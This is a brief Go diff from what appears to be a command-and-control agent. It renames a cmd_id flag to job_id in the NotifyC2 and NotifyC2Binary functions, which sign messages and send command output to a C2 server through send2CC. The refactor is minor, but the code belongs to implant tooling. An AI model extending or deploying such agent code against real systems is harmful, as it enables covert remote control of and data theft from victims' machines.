@@ -56,10 +56,9 @@ func NotifyC2(cmd *cobra.Command, format string, args ...interface{}) {
 	} else {
 		msg.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)
 	}
-	cmd_id, _ := cmd.Flags().GetString("cmd_id")
+	job_id, _ := cmd.Flags().GetString("job_id")
 	cmdSlice := []string{cmd.Name()}
-	msg.CmdID = cmd_id
-	msg.JobID = cmd_id
+	msg.JobID = job_id
 	msg.CmdSlice = cmdSlice
 	msg.Response = []byte(fmt.Sprintf(format, args...))
 	if err := send2CC(&msg); err != nil {
@@ -95,9 +94,9 @@ func NotifyC2Binary(cmd *cobra.Command, data []byte) {
 	} else {
 		msg.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)
 	}
-	cmd_id, _ := cmd.Flags().GetString("cmd_id")
+	job_id, _ := cmd.Flags().GetString("job_id")
 	cmdSlice := []string{cmd.Name()}
-	msg.CmdID = cmd_id
+	msg.JobID = job_id
 	msg.CmdSlice = cmdSlice
 	msg.Response = data
 	if err := send2CC(&msg); err != nil {
